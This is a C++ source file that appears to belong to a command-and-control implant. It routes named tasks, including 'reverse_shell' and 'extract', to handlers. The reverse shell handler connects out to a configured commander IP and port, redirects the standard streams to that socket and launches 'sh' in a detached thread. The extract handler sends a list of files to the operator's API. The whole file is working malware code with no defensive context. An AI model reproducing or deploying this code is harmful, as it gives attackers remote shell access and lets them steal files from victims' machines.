#include "task.hpp"
#include "config.hpp"
#include <memory>
#include <thread>


/* Refactor to hashmap */
std::unique_ptr<Task> parse_task_from_string(std::string name) {
    if (name == "ping") return std::make_unique<PingTask>();
    if (name == "reverse_shell") return std::make_unique<ReverseShellTask>();
    if (name == "extract") return std::make_unique<ExtractTask>();
    return std::make_unique<InvalidTask>();
}

void PingTask::run() {
    auto api = Api::get_instance();
    api.send_result(std::make_unique<Result>("toto", "Pong !", 0));
}

void InvalidTask::run() {}

void ReverseShellTask::run() {
    std::thread thread(worker);
    thread.detach();
}

void ReverseShellTask::worker() {
    auto api = Api::get_instance();

    int port = RS_PORT;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr(RS_IP);

    /* Try to connect to COMMANDER IP */
    if (connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr)) == -1) {
        std::string msg = (std::string)"[ERROR] Failed to start a reverse shell to IP " + COMMANDER_IP + " and port " + std::to_string(COMMANDER_PORT);
        api.send_result(std::make_unique<Result>("totto", msg, 1));
        return;
    }
    std::string msg = (std::string)"[SUCCESS] Successfully started a reverse shell to IP " + COMMANDER_IP + " and port " + std::to_string(COMMANDER_PORT);
    api.send_result(std::make_unique<Result>("toto", msg, 0));
    
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"sh", NULL};
    execvp("sh", argv);
}

void ExtractTask::run() {
    Api api = Api::get_instance();

    for (auto& file_path: file_to_extract) {
        api.send_file(file_path);
    }
}